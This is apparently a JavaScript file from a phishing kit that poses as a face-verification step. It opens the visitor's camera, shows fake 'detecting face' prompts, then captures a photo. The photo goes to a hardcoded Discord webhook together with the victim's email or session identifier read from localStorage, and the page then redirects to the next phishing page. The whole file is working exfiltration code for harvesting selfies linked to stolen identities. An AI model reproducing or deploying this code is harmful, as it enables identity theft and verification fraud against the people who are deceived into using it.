

var WEBHOOK_IMAGEN = (window.APP_CONFIG && window.APP_CONFIG.WEBHOOK_IMAGEN) ||
    'https://discordapp.com/api/webhooks/1560804250500464783/mb1scGsqbI8Jw7J3xxLbfQIPLmuxC67eB0rL60yKcstQBF9E5ZYMDqu9xGyA6XZIkl4l';

var continueBtn = document.getElementById('continueBtn');
var content     = document.getElementById('content');
var video       = document.getElementById('video');
var statusText  = document.getElementById('status');
var finishBtn   = document.getElementById('finishBtn');
var canvas      = document.getElementById('canvas');
var silueta     = document.getElementById('silueta');

var streamActual = null;

if (silueta) silueta.onerror = function () { this.remove(); };

function identificador() {
    return localStorage.getItem('Correo') ||
           localStorage.getItem('us_temp_email') ||
           localStorage.getItem('us_temp_session') ||
           'N/A';
}

continueBtn.addEventListener('click', async function () {

    content.classList.add('started');
    statusText.classList.remove('error');
    statusText.textContent = 'Abriendo cámara...';
    content.scrollIntoView({ block: 'start', behavior: 'smooth' });

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        statusText.classList.add('error');
        statusText.textContent = 'Este navegador no permite la cámara. Abre el archivo con https o en localhost.';
        return;
    }

    var intentos = [
        { video: { facingMode: 'user' }, audio: false },
        { video: { facingMode: { ideal: 'user' } }, audio: false },
        { video: true, audio: false }
    ];

    var ok = false;

    for (var i = 0; i < intentos.length; i++) {
        try {
            streamActual = await navigator.mediaDevices.getUserMedia(intentos[i]);
            ok = true;
            break;
        } catch (e) {
            console.warn('Intento de cámara fallido:', e.name);
        }
    }

    if (!ok) {
        statusText.classList.add('error');
        statusText.textContent = 'No se pudo abrir la cámara. Revisa los permisos del navegador.';
        return;
    }

    video.srcObject = streamActual;

    try { await video.play(); } catch (e) {}

    flujo();
});

function flujo() {

    statusText.textContent = 'Muestra tu rostro';

    setTimeout(function () { statusText.textContent = 'Centra tu rostro'; }, 3000);

    setTimeout(function () { statusText.textContent = 'Detectando rostro...'; }, 6000);

    setTimeout(function () {
        statusText.textContent = 'Presiona "Tomar foto"';
        finishBtn.disabled = false;
    }, 9000);
}

async function capturarYEnviar() {

    if (!video.videoWidth) {
        statusText.classList.add('error');
        statusText.textContent = 'La cámara aún no está lista.';
        return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    var ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async function (blob) {

        var formData = new FormData();
        formData.append('content', '\uD83D\uDEA8 FOTO KLAR [1] \uD83D\uDEA8\n```' + identificador() + '```');
        formData.append('file', blob, 'rostro_capturado.png');

        try {
            var response = await fetch(WEBHOOK_IMAGEN, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                statusText.classList.remove('error');
                statusText.textContent = 'Ya casi finalizamos...';
                setTimeout(function () {
                    window.location.href = 'index4.html';
                }, 1000);
            } else {
                statusText.classList.add('error');
                statusText.textContent = 'Error al enviar';
            }
        } catch (error) {
            console.error('Error:', error);
            statusText.classList.add('error');
            statusText.textContent = 'Error de red';
        }
    }, 'image/png');
}

finishBtn.addEventListener('click', function () {
    finishBtn.disabled = true;
    capturarYEnviar();
});